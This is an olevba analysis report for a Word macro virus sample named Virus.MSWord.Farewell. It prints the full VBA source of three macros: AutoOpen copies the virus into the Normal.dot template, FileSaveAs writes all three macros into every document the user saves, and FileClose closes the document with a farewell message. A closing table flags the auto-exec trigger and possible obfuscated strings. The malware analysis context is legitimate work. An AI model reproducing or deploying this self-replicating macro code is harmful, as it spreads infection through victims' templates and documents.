olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Farewell
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Farewell - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Farewell - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim IsThisMacro$
IsThisMacro$ = WordBasic.[MacroFileName$]("AutoOpen")
IsThisMacro$ = WordBasic.[FileNameInfo$](IsThisMacro$, 3)

If IsThisMacro$ <> "Normal.dot" Then

IsThisMacro$ = WordBasic.[MacroFileName$]("FileSaveAs")
IsThisMacro$ = WordBasic.[FileNameInfo$](IsThisMacro$, 3)
WordBasic.MsgBox IsThisMacro$
If IsThisMacro$ <> "Normal.dot" Then
 WordBasic.MsgBox "This is Autopen Macro!", 32
 Dim SourceName$

 SourceName$ = WordBasic.[FileName$]() + ":AutoOpen"
 WordBasic.MacroCopy SourceName$, "Normal:AutoOpen"

 SourceName$ = WordBasic.[FileName$]() + ":FileSaveAS"
 WordBasic.MacroCopy SourceName$, "Normal:FileSaveAs"


 SourceName$ = WordBasic.[FileName$]() + ":FileClose"
WordBasic.MsgBox SourceName$
 WordBasic.MacroCopy SourceName$, "Normal:FileClose"

WordBasic.FileSaveAll 1, 1
 Else
  WordBasic.MsgBox "Macro Is Not Found!", 16
End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Farewell - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Ñîõðàíåíèå äîêóìåíòà ïîä äðóãèì èìåíåì, â äðóãîì ôîðìàòå èëè ñ äðóãèì ïàðîëåì"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim InfectMacro1$
Dim InfectMacro2$
Dim InfectMacro3$
Dim OnlyName$
Dim noExtension$
Dim InfectName$
 Dim InfectMacro$
 Dim MyString$
 Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error Resume Next
 WordBasic.CurValues.FileSaveAs dlg
 WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then
WordBasic.MsgBox "This is the WordDocument Format!"
 InfectMacro1$ = ":AutoOpen"
 InfectMacro2$ = ":FileSaveAs"
 InfectMacro3$ = ":FileClose"

 OnlyName$ = WordBasic.[FileNameInfo$](dlg.Name, 4)
 noExtension$ = WordBasic.[FileNameInfo$](dlg.Name, 4 + 1)
 InfectName$ = noExtension$ + OnlyName$ + ".doc"
 MyString$ = InfectName$ + InfectMacro1$

 WordBasic.FileSaveAs Name:=InfectName$, Format:=1
 WordBasic.MacroCopy "Normal:AutoOpen", MyString$
 MyString$ = InfectName$ + InfectMacro2$
 WordBasic.MacroCopy "Normal:FileSaveAs", MyString$

 MyString$ = InfectName$ + InfectMacro3$
WordBasic.MsgBox MyString$
 WordBasic.MacroCopy "Normal:FileClose", MyString$
 WordBasic.FileSaveAll 1, 1
WordBasic.MsgBox "Okay"

End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Farewell - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Çàêðûòèå âñåõ îêîí àêòèâíîãî äîêóìåíòà"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
WordBasic.FileClose
WordBasic.MsgBox "Good By User!"
WordBasic.Beep 16
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

